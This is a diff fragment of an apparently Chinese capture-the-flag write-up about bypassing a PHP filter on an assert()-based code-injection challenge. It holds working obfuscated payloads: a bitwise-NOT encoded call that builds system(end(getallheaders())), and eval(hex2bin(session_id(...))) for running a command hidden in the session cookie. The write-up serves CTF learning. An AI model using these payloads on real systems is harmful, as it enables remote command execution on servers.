@@ -175,8 +175,7 @@ if(!isset($_GET[&#39;code&#39;])){
     assert($code);
 }</code></pre><p>第一个过滤掉了一些符号flag.ph中任意的字符，第二个过滤了所有内置函数。</p>
 <p>利用取反构造system(end(getallheaders()))</p>
-<pre><code>?code=(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))
-()))</code></pre><p>利用cookie构造PHPSESSID=命令的hex，也可以</p>
+<pre><code>?code=(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))()))</code></pre><p>利用cookie构造PHPSESSID=命令的hex，也可以</p>
 <pre><code>eval(hex2bin(session_id(session_start())));</code></pre><p>这题过滤不怎么严格，取反直接读也可以用，highlight_file(flag.php)</p>
 
             </div>
